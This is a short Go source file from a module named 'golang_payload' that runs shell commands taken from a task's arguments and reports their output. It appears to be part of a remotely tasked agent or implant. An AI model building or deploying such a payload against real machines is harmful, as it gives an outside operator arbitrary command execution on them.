package actions

import (
	"strings"
	"os/exec"
	"golang_payload/types"
	"golang_payload/utils"
)

func RunCommand(command string) (output string, success bool) {
	parts := strings.Fields(command)
	executable := parts[0]
	args := parts[1:]
	cmd := exec.Command(executable, args...)
	stdout, err := cmd.Output()
	output, success = string(stdout), err == nil
	return
}

func RunCommandFromTask(task types.Task) {
	output, success := RunCommand(task.Args["command"].(string))
	utils.Finish(task, output, success)
}